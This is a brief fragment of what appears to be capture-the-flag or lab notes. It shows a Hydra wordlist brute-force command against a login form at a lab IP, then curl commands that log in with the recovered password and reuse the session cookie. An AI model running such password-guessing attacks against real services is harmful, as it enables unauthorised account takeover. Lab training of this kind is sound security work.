...
```hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.134.146 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V```  
...
```curl -c cookies.txt -d "username=molly&password=sunshine" http://10.49.134.146/login```  
→ Sent login request and saved session cookie for authentication  

```curl -b cookies.txt http://10.49.134.146/```  
